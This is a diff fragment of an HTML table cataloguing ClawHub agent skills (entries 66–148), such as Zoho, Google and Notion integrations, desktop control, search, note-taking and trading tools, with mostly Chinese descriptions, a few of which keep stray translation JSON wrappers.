+<td><a href="https://clawdhub.com/skills/gcalcli-calendar">ClawHub/gcalcli-calendar</a></td>
+<td>使用 gcalcli 操作 Google Calendar：默认仅显示今日日程，通过日程扫描实现有限语义优先查找，支持快速创建/删除并验证——旨在减少工具调用次数和输出量。</td>
+</tr>
+<tr>
+<td align="center">66</td>
+<td>zoho库存</td>
+<td>Zoho Inventory 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-inventory">ClawHub/zoho-inventory</a></td>
+<td>Zoho Inventory API 集成，支持托管 OAuth。管理商品、销售订单、发票、采购订单、账单、联系人及货运。使用此技能时...</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td>zoho日历</td>
+<td>Zoho Calendar 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-calendar">ClawHub/zoho-calendar</a></td>
+<td>通过托管 OAuth 实现 Zoho Calendar API 集成，管理日历和事件，提供完整的日程安排功能，适用于用户需要读取、创建...</td>
+</tr>
+<tr>
+<td align="center">68</td>
+<td>Zoho Recruit</td>
+<td>Zoho Recruit 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-recruit">ClawHub/zoho-recruit</a></td>
+<td>Zoho Recruit API 集成，使用托管 OAuth。可管理候选人、职位空缺、面试和招聘工作流。适用于用户想要重新...的情况。</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td>Attio</td>
+<td>Attio 🔑</td>
+<td><a href="https://clawdhub.com/skills/attio-api">ClawHub/attio-api</a></td>
+<td>托管 OAuth 实现的 Attio API 集成，可管理人员、公司和自定义对象等 CRM 数据，适用于用户需要创建、读取、更新...的场景</td>
+</tr>
+<tr>
+<td align="center">70</td>
+<td>Things Mac</td>
+<td>Things Mac</td>
+<td><a href="https://clawdhub.com/skills/things-mac">ClawHub/things-mac</a></td>
+<td>使用 `things` CLI 在 macOS 上管理 Things 3（通过 URL 方案添加/更新项目和待办事项，读取/搜索/列出本地 Things 数据库）。适用于用户请求添加任务、列出收件箱/今日/即将到来的任务、搜索任务或检查项目/区域/标签。</td>
+</tr>
+<tr>
+<td align="center">71</td>
+<td>Zoho People</td>
+<td>Zoho People 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-people">ClawHub/zoho-people</a></td>
+<td>Zoho People API 与托管 OAuth 集成，管理员工、部门、职位、考勤和请假，适用于用户需要读取...</td>
+</tr>
+<tr>
+<td align="center">72</td>
+<td>Zoho Bigin</td>
+<td>Zoho Bigin 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-bigin">ClawHub/zoho-bigin</a></td>
+<td>通过托管OAuth实现Zoho Bigin API集成，可在Bigin CRM中管理联系人、公司、管道和产品，适用于用户需要读取、创建等操作。</td>
+</tr>
+<tr>
+<td align="center">73</td>
+<td>新闻aggregator</td>
+<td>News Aggregator</td>
+<td><a href="https://clawdhub.com/skills/news-aggregator">ClawHub/news-aggregator</a></td>
+<td>国内外社会、科技、军事新闻汇总。自动搜索、筛选、整理新闻要点。</td>
+</tr>
+<tr>
+<td align="center">74</td>
+<td>谷歌drive</td>
+<td>Google Drive 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-drive">ClawHub/google-drive</a></td>
+<td>Google Drive API 集成，支持托管式 OAuth。可列出、搜索、创建和管理文件及文件夹。当用户需要与 Google Drive 交互时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">75</td>
+<td>Linear</td>
+<td>Linear 🔑</td>
+<td><a href="https://clawdhub.com/skills/linear">ClawHub/linear</a></td>
+<td>查询与管理 Linear 问题、项目及团队工作流。</td>
+</tr>
+<tr>
+<td align="center">76</td>
+<td>PPT工作流</td>
+<td>PPT Workflow</td>
+<td><a href="https://clawdhub.com/skills/ppt-workflow">ClawHub/ppt-workflow</a></td>
+<td>基于标准化工作流的 PPT 制作技能。从内容搜索到美化优化的全流程自动化。只需提供主题，自动完成文献搜索、框架设计、内容填充、幻灯片制作、美化优化和输出交付。</td>
+</tr>
+<tr>
+<td align="center">77</td>
+<td>tavily网页搜索forOpenClaw</td>
+<td>Tavily Web Search Skill for OpenClaw 🦀 🔑</td>
+<td><a href="https://clawdhub.com/skills/tavily-web-search-for-openclaw">ClawHub/tavily-web-search-for-openclaw</a></td>
+<td>use this when the user asks to search the web, look up recent information, check current events, gather online sources, or research a topic using tavily search.</td>
+</tr>
+<tr>
+<td align="center">78</td>
+<td>Notion技能</td>
+<td>Notion 🔑</td>
+<td><a href="https://clawdhub.com/skills/notion-skill">ClawHub/notion-skill</a></td>
+<td>{&quot;answer&quot;:&quot;通过官方 Notion API 操作页面和数据库。&quot;}</td>
+</tr>
+<tr>
+<td align="center">79</td>
+<td>indepth研究</td>
+<td>Deep Research</td>
+<td><a href="https://clawdhub.com/skills/in-depth-research">ClawHub/in-depth-research</a></td>
+<td>开展详尽多源调查，涵盖方法追踪、来源评估与迭代深度。</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td>查找</td>
+<td>Find</td>
+<td><a href="https://clawdhub.com/skills/find">ClawHub/find</a></td>
+<td>利用渐进式搜索扩展、多源验证及迭代优化，直至定位目标。</td>
+</tr>
+<tr>
+<td align="center">81</td>
+<td>谷歌workspaceMCP</td>
+<td>Google Workspace (No Cloud Console)</td>
+<td><a href="https://clawdhub.com/skills/google-workspace-mcp">ClawHub/google-workspace-mcp</a></td>
+<td>支持 Gmail、日历、云端硬盘、文档、表格——无需 Google Cloud Console。仅需 OAuth 登录。相比传统 Google API 集成，设置零复杂度。</td>
+</tr>
+<tr>
+<td align="center">82</td>
+<td>desktop控制win</td>
+<td>Desktop Control (Windows)</td>
+<td><a href="https://clawdhub.com/skills/desktop-control-win">ClawHub/desktop-control-win</a></td>
+<td>控制Windows桌面应用——启动、关闭、聚焦、调整窗口、模拟键鼠输入、管理进程、控制VSCode、读取剪贴板及截取屏幕信息。适用于需要与运行程序交互、切换窗口、输入文本、按快捷键、在VSCode中打开文件、管理进程或获取系统显示信息时。</td>
+</tr>
+<tr>
+<td align="center">83</td>
+<td>Wps技能</td>
+<td>Wps Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/wps-office">ClawHub/wps-office</a></td>
+<td>自动化WPS Office任务，包括文档创建、打开、格式转换、批量处理，及管理WPS 365智能表单、文档、表格、流程图...</td>
+</tr>
+<tr>
+<td align="center">84</td>
+<td>My Tesla</td>
+<td>My Tesla 🔑</td>
+<td><a href="https://clawdhub.com/skills/my-tesla">ClawHub/my-tesla</a></td>
+<td>通过 teslapy 利用 Tesla Owner API 在 macOS 上控制特斯拉车辆（认证、列表、状态、锁/解锁、空调、充电、定位及其他）。用于查看车辆状态或执行安全的远程指令。专为 Parth Maniar (@officialpm) 设计，具备本地认证缓存、破坏性操作确认机制及聊天友好的状态输出。</td>
+</tr>
+<tr>
+<td align="center">85</td>
+<td>bear笔记</td>
+<td>Bear Notes 🔑</td>
+<td><a href="https://clawdhub.com/skills/bear-notes">ClawHub/bear-notes</a></td>
+<td>{&quot;answer&quot;:&quot;通过 grizzly CLI 创建、搜索和管理 Bear 笔记。&quot;}</td>
+</tr>
+<tr>
+<td align="center">86</td>
+<td>LinuxGUI控制</td>
+<td>Linux GUI  Control</td>
+<td><a href="https://clawdhub.com/skills/guicountrol">ClawHub/guicountrol</a></td>
+<td>使用 xdotool、wmctrl 和 dogtail 控制 Linux 桌面 GUI。适用于与非浏览器应用交互、模拟鼠标/键盘输入、管理窗口或检查 X11/GNOME 上的应用 UI 层级。支持：(1) 在应用中点击/输入，(2) 调整窗口大小/移动窗口，(3) 提取应用的文本 UI 树 (A11y)，(4) 截图进行视觉分析。</td>
+</tr>
+<tr>
+<td align="center">87</td>
+<td>股票查询</td>
+<td>股票查询</td>
+<td><a href="https://clawdhub.com/skills/stock">ClawHub/stock</a></td>
+<td>查询A股、港股、美股股票的实时行情，包括价格、涨跌幅、开盘价、成交量等详细数据。</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td>Ordercli</td>
+<td>Ordercli</td>
+<td><a href="https://clawdhub.com/skills/ordercli">ClawHub/ordercli</a></td>
+<td>仅限 Foodora 的命令行工具，用于查看历史订单和当前订单状态（Deliveroo 开发中）。</td>
+</tr>
+<tr>
+<td align="center">89</td>
+<td>tiangongwpsWord自动化</td>
+<td>Word Automation</td>
+<td><a href="https://clawdhub.com/skills/tiangong-wps-word-automation">ClawHub/tiangong-wps-word-automation</a></td>
+<td>{   &quot;translation&quot;: &quot;通过 Windows COM 自动化 Word/WPS 文档常用操作（读取文本、替换、插入、标题、页眉页脚、分页符、合并、拆分、导出 PDF/TXT、添加/替换图片）。仅限单文档操作（非批量）。&quot; }</td>
+</tr>
+<tr>
+<td align="center">90</td>
+<td>PDF生成器</td>
+<td>Pdf Generator</td>
+<td><a href="https://clawdhub.com/skills/pdf-generator">ClawHub/pdf-generator</a></td>
+<td>从Markdown、HTML、数据或代码生成专业PDF。支持报告、发票、合同等符合最佳实践的文档。</td>
+</tr>
+<tr>
+<td align="center">91</td>
+<td>百度baike数据</td>
+<td>baidu baike search 🔑</td>
+<td><a href="https://clawdhub.com/skills/baidu-baike-data">ClawHub/baidu-baike-data</a></td>
+<td>百度百科组件是一款知识服务工具，用于查询各类名词的权威百科解释。其核心功能是根据用户输入的特定名词（如人物、地点、概念等），返回来自百度百科的标准化详细词条释义。</td>
+</tr>
+<tr>
+<td align="center">92</td>
+<td>Eightctl</td>
+<td>Eightctl 🔑</td>
+<td><a href="https://clawdhub.com/skills/eightctl">ClawHub/eightctl</a></td>
+<td>控制Eight Sleep床垫（状态、温度、闹钟、日程）。</td>
+</tr>
+<tr>
+<td align="center">93</td>
+<td>AI会议笔记</td>
+<td>AI Meeting Notes w/ Action Items + To-Do List Tracker</td>
+<td><a href="https://clawdhub.com/skills/ai-meeting-notes">ClawHub/ai-meeting-notes</a></td>
+<td>将凌乱的笔记快速转化为清晰行动项。即时粘贴任意会议记录、转录或文本，获取摘要、带负责人和截止日期的行动项。自动保存、可搜索，集成待办追踪。无需机器人、无需订阅、无需设置。</td>
+</tr>
+<tr>
+<td align="center">94</td>
+<td>Excel</td>
+<td>Excel</td>
+<td><a href="https://clawdhub.com/skills/ws-excel">ClawHub/ws-excel</a></td>
+<td>Excel 操作。数据处理、公式、表格操作。</td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td>topic监控</td>
+<td>Topic Monitor</td>
+<td><a href="https://clawdhub.com/skills/topic-monitor">ClawHub/topic-monitor</a></td>
+<td>监控感兴趣的话题，在出现重要动态时主动提醒。用于用户需要自动化监控特定主题（如公共关系）的场景。</td>
+</tr>
+<tr>
+<td align="center">96</td>
+<td>抖音hottrend</td>
+<td>Douyin Hot Trend</td>
+<td><a href="https://clawdhub.com/skills/douyin-hot-trend">ClawHub/douyin-hot-trend</a></td>
+<td>获取抖音热榜/热搜榜数据，包含热门视频、挑战赛、音乐等多领域热门内容，并输出标题、热度值、跳转链接及封面图（如有）。</td>
+</tr>
+<tr>
+<td align="center">97</td>
+<td>mission控制</td>
+<td>Mission Control</td>
+<td><a href="https://clawdhub.com/skills/mission-control">ClawHub/mission-control</a></td>
+<td>面向AI助手的看板式任务管理面板。支持通过CLI或界面UI管理任务。当用户提及任务、看板、任务板、任务控制...时使用。</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td>Postiz is a tool to schedule social media and chat posts to 28+ channels X, LinkedIn, LinkedIn Page, Reddit, Instagram, Facebook Page, Threads, YouTube, Google My Business, TikTok, Pinterest, Dribbble, Discord, Slack, Kick, Twitch, Mastodon, Bluesky, Lemmy, Farcaster, Telegram, Nostr, VK, Medium, Dev.to, Hashnode, WordPress, ListMonk</td>
+<td>Postiz is a tool to schedule social media and chat posts to 28+ channels X, LinkedIn, LinkedIn Page, Reddit, Instagram, Facebook Page, Threads, YouTube, Google My Business, TikTok, Pinterest, Dribbble, Discord, Slack, Kick, Twitch, Mastodon, Bluesky, Lemmy, Farcaster, Telegram, Nostr, VK, Medium, Dev.to, Hashnode, WordPress, ListMonk 🔑</td>
+<td><a href="https://clawdhub.com/skills/postiz">ClawHub/postiz</a></td>
+<td>Postiz is a tool to schedule social media and chat posts to 28+ channels X, LinkedIn, LinkedIn Page, Reddit, Instagram, Facebook Page, Threads, YouTube, Goog...</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td>提醒</td>
+<td>Reminder</td>
+<td><a href="https://clawdhub.com/skills/reminder">ClawHub/reminder</a></td>
+<td>捕获自然语言事件，保存至工作区，安排 Telegram 提醒，自动 cron 通知并查询即将到来的事件。</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td>飞书文档</td>
+<td>Feishu Doc 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-doc">ClawHub/feishu-doc</a></td>
+<td>从飞书（Lark）的 Wiki、文档、表格和多维表格获取内容，自动解析 Wiki URL 为真实实体，并转换为 Markdown 格式。</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td>gogcli谷歌WorkspaceCLI</td>
+<td>gogcli - Google Workspace CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/gogcli">ClawHub/gogcli</a></td>
+<td>用于管理Google Workspace服务（Gmail、日历、Drive、表格、文档、幻灯片、联系人、任务、人员、群组和Keep）的命令行工具。</td>
+</tr>
+<tr>
+<td align="center">102</td>
+<td>WordCn</td>
+<td>Docx Cn</td>
+<td><a href="https://clawdhub.com/skills/docx-cn">ClawHub/docx-cn</a></td>
+<td>Word 文档处理 | Word Document Processing. 创建、读取、编辑 Word 文档 | Create, read, edit Word documents. 支持 .docx 格式、格式化、表格、图片 | Supports .docx format, formatting, tables...</td>
+</tr>
+<tr>
+<td align="center">103</td>
+<td>专注深度work</td>
+<td>Focus Deep Work</td>
+<td><a href="https://clawdhub.com/skills/focus-deep-work">ClawHub/focus-deep-work</a></td>
+<td>通过专注时段、干扰记录和生产力追踪，最大化深度工作</td>
+</tr>
+<tr>
+<td align="center">104</td>
+<td>谷歌日历API</td>
+<td>Google Calendar 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-calendar-api">ClawHub/google-calendar-api</a></td>
+<td>通过托管 OAuth 集成 Google Calendar API。可创建活动、列出日历、检查空闲时间并管理日程。当用户想要...</td>
+</tr>
+<tr>
+<td align="center">105</td>
+<td>文件organizer技能</td>
+<td>File Organizer Skill</td>
+<td><a href="https://clawdhub.com/skills/file-organizer-skill">ClawHub/file-organizer-skill</a></td>
+<td>{ &quot;translation&quot;: &quot;按扩展名或日期分文件夹整理目录文件，支持预演、递归及撤销功能。&quot; }</td>
+</tr>
+<tr>
+<td align="center">106</td>
+<td>NotionAPI技能</td>
+<td>Notion 🔑</td>
+<td><a href="https://clawdhub.com/skills/notion-api-skill">ClawHub/notion-api-skill</a></td>
+<td>Notion API 集成，托管 OAuth 支持。可查询数据库、搜索页面、读取工作区内容。写入操作需用户明确确认。</td>
+</tr>
+<tr>
+<td align="center">107</td>
+<td>语音wakesay</td>
+<td>Voice Wake Say</td>
+<td><a href="https://clawdhub.com/skills/voice-wake-say">ClawHub/voice-wake-say</a></td>
+<td>{&quot;description_zh&quot;:&quot;使用macOS内置的`say`命令朗读响应，当检测到语音唤醒/语音识别时（如消息以&quot;User talked via voice recognition on &lt;device&gt;&quot;开头）。&quot;}</td>
+</tr>
+<tr>
+<td align="center">108</td>
+<td>Thinking Partner</td>
+<td>Thinking Partner</td>
+<td><a href="https://clawdhub.com/skills/thinking-partner">ClawHub/thinking-partner</a></td>
+<td>通过提问探索复杂问题的协作思考伙伴</td>
+</tr>
+<tr>
+<td align="center">109</td>
+<td>新闻aggregator技能</td>
+<td>News Aggregator Skill</td>
+<td><a href="https://clawdhub.com/skills/news-aggregator-skill">ClawHub/news-aggregator-skill</a></td>
+<td>{&quot;answer&quot;:&quot;聚合 Hacker News、GitHub Trending、Product Hunt、36Kr、腾讯新闻、华尔街见闻、V2EX 及微博等 8 大来源的实时内容，提供抓取、过滤与深度分析。最适合“每日速览”、“科技简报”、“财经动态”及热点“深度解读”。&quot;}</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td>tiangongwpsPPT自动化</td>
+<td>PowerPoint Automation</td>
+<td><a href="https://clawdhub.com/skills/tiangong-wps-ppt-automation">ClawHub/tiangong-wps-ppt-automation</a></td>
+<td>通过COM自动化Windows上的PowerPoint/WPS演示文稿操作（读取文本/备注/大纲、导出PDF/图片、替换文本、插入/删除幻灯片、统一字体/字号/主题、提取图片/媒体）。适用于单文件处理（不支持批量）。</td>
+</tr>
+<tr>
+<td align="center">111</td>
+<td>写作plans</td>
+<td>Writing Plans</td>
+<td><a href="https://clawdhub.com/skills/writing-plans">ClawHub/writing-plans</a></td>
+<td>在接触代码之前，当有多步任务的规格或需求时使用。</td>
+</tr>
+<tr>
+<td align="center">112</td>
+<td>股股票交易助手</td>
+<td>A股股票交易助手</td>
+<td><a href="https://clawdhub.com/skills/stock-trader">ClawHub/stock-trader</a></td>
+<td>A股股票分析助手。支持实时股价查询、批量查询、财经新闻、潜力股分析、行业资金流向、龙头股分析、消息面情感分析、激进型模拟交易。触发场景：(1) 查询股票实时价格 (2) 分析消息面预测走势 (3) 行业资金+龙头分析 (4) 激进型模拟交易 (5) 制定买卖策略。</td>
+</tr>
+<tr>
+<td align="center">113</td>
+<td>网页pilot</td>
+<td>Web Pilot</td>
+<td><a href="https://clawdhub.com/skills/web-pilot">ClawHub/web-pilot</a></td>
+<td>无需 API 密钥即可进行网络搜索并读取页面内容，适用于通过 DuckDuckGo/Brave/Google（多页）搜索并提取 URL 可读文本。</td>
+</tr>
+<tr>
+<td align="center">114</td>
+<td>记忆配置OpenClaw</td>
+<td>Memory Setup (OpenClaw)</td>
+<td><a href="https://clawdhub.com/skills/memory-setup-openclaw">ClawHub/memory-setup-openclaw</a></td>
+<td>配置并验证 OpenClaw 记忆回溯以实现持久化上下文。适用于启用 memory_search/memory_get、修复记忆召回不佳或配置 ME...</td>
+</tr>
+<tr>
+<td align="center">115</td>
+<td>Clawflows</td>
+<td>Clawflows</td>
+<td><a href="https://clawdhub.com/skills/clawflows">ClawHub/clawflows</a></td>
+<td>在 clawflows.com 上搜索、安装和运行多技能自动化。将多个技能组合成强大的工作流，包含逻辑、条件以及步骤之间的数据流。</td>
+</tr>
+<tr>
+<td align="center">116</td>
+<td>Swelist</td>
+<td>Swelist 🔑</td>
+<td><a href="https://clawdhub.com/skills/swelist">ClawHub/swelist</a></td>
+<td>帮助寻找技术实习和应届生岗位，追踪本地每个申请，备战面试，无需注册。</td>
+</tr>
+<tr>
+<td align="center">117</td>
+<td>braveAPI搜索</td>
+<td>Brave Api Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/brave-api-search">ClawHub/brave-api-search</a></td>
+<td>Real-time web search, autosuggest, and AI-powered answers using the official Brave Search API. Use for searching documentation, facts, current events, or any...</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td>macOS日历</td>
+<td>macOS Calendar</td>
+<td><a href="https://clawdhub.com/skills/macos-calendar">ClawHub/macos-calendar</a></td>
+<td>通过 AppleScript 创建、列出和管理 macOS 日历事件。适用于用户要求添加提醒、安排日程、创建日历条目、设置日期等场景。</td>
+</tr>
+<tr>
+<td align="center">119</td>
+<td>productivity自动化套件</td>
+<td>Productivity Automation Kit</td>
+<td><a href="https://clawdhub.com/skills/productivity-automation-kit">ClawHub/productivity-automation-kit</a></td>
+<td>效率自动化工具箱 — 自动化工作流模板 + 日程管理助手 + 任务提醒工具 + 数据整理自动化。整合热门Skill功能，帮助用户识别自动化机会、设计工作流、管理日程、追踪任务、整理数据。触发词：效率自动化、工作流模板、日程管理、任务提醒、数据整理自动化、每天提醒、每周计划、自动化流程、省时工具。</td>
+</tr>
+<tr>
+<td align="center">120</td>
+<td>Supermemory</td>
+<td>Supermemory 🔑</td>
+<td><a href="https://clawdhub.com/skills/supermemory">ClawHub/supermemory</a></td>
+<td>使用 SuperMemory API 存储、检索记忆，添加内容、搜索记忆，与知识库对话。</td>
+</tr>
+<tr>
+<td align="center">121</td>
+<td>Realtime网页搜索</td>
+<td>Realtime Web Search</td>
+<td><a href="https://clawdhub.com/skills/super-websearch-realtime">ClawHub/super-websearch-realtime</a></td>
+<td>优先使用实时网络搜索获取实时信息。</td>
+</tr>
+<tr>
+<td align="center">122</td>
+<td>Personal Productivity</td>
+<td>Personal Productivity</td>
+<td><a href="https://clawdhub.com/skills/personal-productivity">ClawHub/personal-productivity</a></td>
+<td>个人效率与时间管理顾问。帮助用户更好地管理时间、任务和能量，提升工作效率。当用户询问如何提高效率、时间管理、任务规划、专注力、拖延症等问题时触发。</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td>Todoist</td>
+<td>Todoist 🔑</td>
+<td><a href="https://clawdhub.com/skills/todoist-api">ClawHub/todoist-api</a></td>
+<td>Todoist API 集成（托管 OAuth），可管理任务、项目、版块、标签和评论。用于创建、更新、完成等操作。</td>
+</tr>
+<tr>
+<td align="center">124</td>
+<td>待办追踪器</td>
+<td>TODO Tracker</td>
+<td><a href="https://clawdhub.com/skills/todo-tracker">ClawHub/todo-tracker</a></td>
+<td>用于跨会话跟踪任务的持久化待办暂存区。当用户说“add to TODO”、“what's on the TODO”、“mark X done”、“show TODO list”、“remove from TODO”或询问待处理任务时使用。亦通过心跳触发提醒过期项目。</td>
+</tr>
+<tr>
+<td align="center">125</td>
+<td>Windows控制</td>
+<td>Windows Control</td>
+<td><a href="https://clawdhub.com/skills/windows-control">ClawHub/windows-control</a></td>
+<td>完全控制Windows桌面，支持鼠标、键盘及截图，像真人一样操作任何Windows应用。</td>
+</tr>
+<tr>
+<td align="center">126</td>
+<td>任务decomposer</td>
+<td>task-decomposer</td>
+<td><a href="https://clawdhub.com/skills/task-decomposer">ClawHub/task-decomposer</a></td>
+<td>task-decomposer</td>
+</tr>
+<tr>
+<td align="center">127</td>
+<td>language学习</td>
+<td>Language Learning Tutor</td>
+<td><a href="https://clawdhub.com/skills/language-learning">ClawHub/language-learning</a></td>
+<td>AI语言导师，通过对话、词汇练习、语法课程、抽认卡及沉浸式练习，助您学习任意语言。适用于学习新语言、练词汇、学语法、翻译、会话练习、旅行准备、习语俚语或改善发音。支持包括中、英、日、韩、法、德、西等在内的100多种语言。</td>
+</tr>
+<tr>
+<td align="center">128</td>
+<td>谷歌文档</td>
+<td>Google Docs 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-docs">ClawHub/google-docs</a></td>
+<td>通过托管 OAuth 集成 Google Docs API，创建文档、插入文本、应用格式并管理内容。适用于用户想要进行交互的场景。</td>
+</tr>
+<tr>
+<td align="center">129</td>
+<td>飞书日历</td>
+<td>Lark Calendar &amp; Tasks 🔑</td>
+<td><a href="https://clawdhub.com/skills/lark-calendar">ClawHub/lark-calendar</a></td>
+<td>在飞书中创建、更新及删除日程事件与任务。包含员工通讯录，支持自动解析姓名为用户ID。</td>
+</tr>
+<tr>
+<td align="center">130</td>
+<td>Markdown</td>
+<td>Markdown</td>
+<td><a href="https://clawdhub.com/skills/markdown">ClawHub/markdown</a></td>
+<td>生成简洁、可移植的Markdown，在不同解析器中正确渲染</td>
+</tr>
+<tr>
+<td align="center">131</td>
+<td>抖音下载器-douyin_downloader</td>
+<td>抖音下载器-douyin_downloader 🔑</td>
+<td><a href="https://clawdhub.com/skills/douyin-downloader">ClawHub/douyin-downloader</a></td>
+<td>最稳定的抖音视频下载工具，用户提供抖音链接或modal_id即可自动解析并下载。</td>
+</tr>
+<tr>
+<td align="center">132</td>
+<td>Obsidian - read, search, write and edit direct to obsidian vault.</td>
+<td>Obsidian - read, search, write and edit direct to obsidian vault.</td>
+<td><a href="https://clawdhub.com/skills/obsidian-direct">ClawHub/obsidian-direct</a></td>
+<td>使用 Obsidian 库作为知识库，提供模糊/音标搜索、自动检测新笔记文件夹、创建/读取/编辑带 frontmatter 的笔记、管理标签和 wikilinks。适用于查询、存储和编辑笔记。</td>
+</tr>
+<tr>
+<td align="center">133</td>
+<td>base交易员</td>
+<td>Base Trader 🔑</td>
+<td><a href="https://clawdhub.com/skills/base-trader">ClawHub/base-trader</a></td>
+<td>通过 Bankr 在 Base 上进行自主加密交易。适用于代币交易、监控上线、执行策略或管理投资组合。触发词包括“trade”、“buy”、“sell”、“launch”、“snipe”、“profit”、“PnL”、“portfolio balance”或 Base 上的任何加密交易任务。</td>
+</tr>
+<tr>
+<td align="center">134</td>
+<td>文件organizerzh</td>
+<td>File Organizer</td>
+<td><a href="https://clawdhub.com/skills/file-organizer-zh">ClawHub/file-organizer-zh</a></td>
+<td>文件整理器，按类型自动分类（中文版）</td>
+</tr>
+<tr>
+<td align="center">135</td>
+<td>记忆systemv2</td>
+<td>Memory System V2</td>
+<td><a href="https://clawdhub.com/skills/memory-system-v2">ClawHub/memory-system-v2</a></td>
+<td>快速语义记忆系统，支持JSON索引和自动整合，搜索延迟&lt;20毫秒。用于捕获学习、决策、洞察和事件，适用于需要跨会话持久记忆或回溯之前工作与决策的场景。</td>
+</tr>
+<tr>
+<td align="center">136</td>
+<td>YouTubeSummarizer</td>
+<td>YouTube Summarizer</td>
+<td><a href="https://clawdhub.com/skills/youtube-summarizer">ClawHub/youtube-summarizer</a></td>
+<td>自动获取 YouTube 视频文稿，生成结构化摘要并发送全文至消息平台。自动检测链接，提供元数据、关键见解及可下载文稿。</td>
+</tr>
+<tr>
+<td align="center">137</td>
+<td>微软OneDrive</td>
+<td>Microsoft OneDrive 🔑</td>
+<td><a href="https://clawdhub.com/skills/one-drive">ClawHub/one-drive</a></td>
+<td>通过 Microsoft Graph 的托管 OAuth 实现 OneDrive API 集成，可管理文件、文件夹和共享，适用于用户上传、下载、整理等需求。</td>
+</tr>
+<tr>
+<td align="center">138</td>
+<td>obsidian本体同步</td>
+<td>Obsidian Ontology Sync</td>
+<td><a href="https://clawdhub.com/skills/obsidian-ontology-sync">ClawHub/obsidian-ontology-sync</a></td>
+<td>实现Obsidian PKM（易读笔记）与结构化本体（机器可查询图谱）间的双向同步，自动提取实体与关系。</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td>notebooklm技能</td>
+<td>Notebooklm</td>
+<td><a href="https://clawdhub.com/skills/notebooklm-skill">ClawHub/notebooklm-skill</a></td>
+<td>利用此技能直接从 Claude Code 查询 Google NotebookLM，获取 Gemini 提供的基于来源、附引证的回答。支持浏览器自动化、知识库管理及持久认证。通过仅响应文档内容，大幅减少幻觉。</td>
+</tr>
+<tr>
+<td align="center">140</td>
+<td>自动化工作流010</td>
+<td>Automation Workflows 0.1.0</td>
+<td><a href="https://clawdhub.com/skills/automation-workflows-0-1-0">ClawHub/automation-workflows-0-1-0</a></td>
+<td>设计和实施自动化工作流，帮助个体创业者节省时间并扩展业务。用于识别可自动化的重复性任务、跨工具构建工作流、设置触发器和操作，或优化现有自动化。涵盖自动化机会识别、工作流设计、工具选择（Zapier、Make、n8n）、测试及维护。</td>
+</tr>
+<tr>
+<td align="center">141</td>
+<td>PARA Second Brain</td>
+<td>PARA Second Brain</td>
+<td><a href="https://clawdhub.com/skills/para-second-brain">ClawHub/para-second-brain</a></td>
+<td>使用 PARA（项目、领域、资源、归档）组织智能体知识并实现全面可搜索。符号链接技巧支持整个知识库的完整语义搜索（不仅限 MEMORY.md），并包含会话记录索引与内存刷新协议。智能体真正拥有了第二大脑。</td>
+</tr>
+<tr>
+<td align="center">142</td>
+<td>数据可视化2</td>
+<td>Data Visualization</td>
+<td><a href="https://clawdhub.com/skills/data-visualization-2">ClawHub/data-visualization-2</a></td>
+<td>数据可视化，涵盖图表选择、配色理论与标注最佳实践，包括柱状图、折线图、散点图、热力图等类型，坐标轴规则及叙事技巧。</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td>RSSAIReader</td>
+<td>Rss Ai Reader 🔑</td>
+<td><a href="https://clawdhub.com/skills/rss-ai-reader">ClawHub/rss-ai-reader</a></td>
+<td>📰 RSS AI 阅读器 — 自动抓取订阅、LLM生成摘要、多渠道推送！ 支持 Claude/OpenAI 生成中文摘要，推送到飞书/Telegram/Email。 触发条件: 用户要求订阅RSS、监控博客、抓取新闻、生成摘要、设置定时抓取、 &quot;帮我订阅&quot;、&quot;监控这个网站&quot;、&quot;每天推送新闻&quot;、RSS/Atom feed 相关。</td>
+</tr>
+<tr>
+<td align="center">144</td>
+<td>谷歌任务API</td>
+<td>Google Tasks 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-tasks-api">ClawHub/google-tasks-api</a></td>
+<td>通过托管OAuth集成Google Tasks API，支持任务列表和任务的完整增删改查操作。当用户需要读取、创建、更新...</td>
+</tr>
+<tr>
+<td align="center">145</td>
+<td>定时</td>
+<td>Cron</td>
+<td><a href="https://clawdhub.com/skills/cron">ClawHub/cron</a></td>
+<td>本地优先的重复计划引擎，用于提醒、重复任务和基于时间的执行计划。当用户提到重复时间、周期性时使用。</td>
+</tr>
+<tr>
+<td align="center">146</td>
+<td>AutomateExcel</td>
+<td>Automate Excel</td>
+<td><a href="https://clawdhub.com/skills/automate-excel">ClawHub/automate-excel</a></td>
+<td>自动化 Excel (.xlsx/.xls) 文件的读写、合并、转换及校验。适用于电子表格操作及 Excel 数据处理。</td>
+</tr>
+<tr>
+<td align="center">147</td>
+<td>多搜索引擎201</td>
+<td>Multi Search Engine 2.0.1</td>
+<td><a href="https://clawdhub.com/skills/multi-search-engine-2-0-1">ClawHub/multi-search-engine-2-0-1</a></td>
+<td>多搜索引擎集成，17个引擎（8个国内+9个全球），支持高级搜索运算符、时间筛选、站点搜索、隐私搜索引擎及 Wolfra...</td>
+</tr>
+<tr>
+<td align="center">148</td>
+<td>Spotify</td>
+<td>Spotify</td>
+<td><a href="https://clawdhub.com/skills/spotify">ClawHub/spotify</a></td>
